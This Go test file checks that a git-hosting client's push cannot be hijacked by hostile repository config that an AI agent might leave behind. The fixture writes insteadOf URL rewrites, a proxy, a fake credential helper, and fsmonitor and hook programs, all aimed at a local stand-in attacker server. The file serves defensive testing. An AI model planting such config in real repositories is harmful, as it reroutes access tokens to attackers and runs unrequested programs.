package githost

import (
	"context"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"sync/atomic"
	"testing"
)

// hostileSource writes the config an agent could leave in its working
// directory: a rewrite of the remote, a proxy, a credential helper, a
// fsmonitor program and a pre-push hook. Each points at evil.
func hostileSource(t *testing.T, fx gitFixture, goodURL, evilURL, only string) (marker string) {
	t.Helper()
	marker = filepath.Join(t.TempDir(), "hook-ran")
	hook := filepath.Join(fx.work, ".git", "hooks", "pre-push")
	must(t, os.MkdirAll(filepath.Dir(hook), 0o755))
	must(t, os.WriteFile(hook, []byte("#!/bin/sh\ntouch '"+marker+"'\n"), 0o755))
	parts := map[string]string{
		"insteadOf": "[url \"" + evilURL + "/\"]\n\tinsteadOf = " + goodURL + "/\n",
		"proxy":     "[http]\n\tproxy = " + evilURL + "\n",
		"programs": "[credential]\n\thelper = !echo username=evil; echo password=evil\n" +
			"[core]\n\tfsmonitor = touch " + marker + "\n\thooksPath = " + filepath.Dir(hook) + "\n" +
			"[uploadpack]\n\tpackObjectsHook = touch " + marker + "\n",
	}
	cfg := ""
	for name, text := range parts {
		if only == "all" || only == name {
			cfg += text
		}
	}
	f, err := os.OpenFile(filepath.Join(fx.work, ".git", "config"), os.O_APPEND|os.O_WRONLY, 0o644)
	must(t, err)
	_, err = f.WriteString(cfg)
	must(t, err)
	must(t, f.Close())
	return marker
}

func TestHostileSourceConfigCannotRedirectTheToken(t *testing.T) {
	for _, only := range []string{"insteadOf", "proxy", "programs", "all"} {
		t.Run(only, func(t *testing.T) { hostileCase(t, only) })
	}
}

func hostileCase(t *testing.T, only string) {
	fx := newGitFixture(t)
	var evilHits, goodAuthed atomic.Int32
	evil := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		evilHits.Add(1)
		t.Errorf("the attacker server was contacted: %s %s auth=%v", r.Method, r.URL.Path, r.Header.Get("Authorization") != "")
		w.Header().Set("WWW-Authenticate", `Basic realm="git"`)
		w.WriteHeader(401)
	}))
	defer evil.Close()
	good := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if r.Header.Get("Authorization") == "" {
			w.Header().Set("WWW-Authenticate", `Basic realm="git"`)
			w.WriteHeader(401)
			return
		}
		goodAuthed.Add(1)
		http.Error(w, "no", 403)
	}))
	defer good.Close()
	marker := hostileSource(t, fx, good.URL, evil.URL, only)

	api := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Write([]byte(`{"default_branch":"main"}`))
	}))
	defer api.Close()
	g := newGitHubClient(t, api.URL, strings.TrimPrefix(good.URL, "http://"), nil, false)
	err := g.PushBranch(context.Background(), fx.work, fx.c1, "factory/run-1")
	if err == nil {
		t.Fatal("push to a server that says 403 succeeded")
	}
	if strings.Contains(err.Error(), testToken) {
		t.Fatalf("error holds the token: %v", err)
	}
	if evilHits.Load() != 0 {
		t.Fatalf("the attacker server got %d requests", evilHits.Load())
	}
	if goodAuthed.Load() == 0 {
		t.Fatalf("the real server never got the credential, so the test proves nothing; err=%v", err)
	}
	if _, err := os.Stat(marker); err == nil {
		t.Fatal("a program named in the source repository config ran")
	}
}
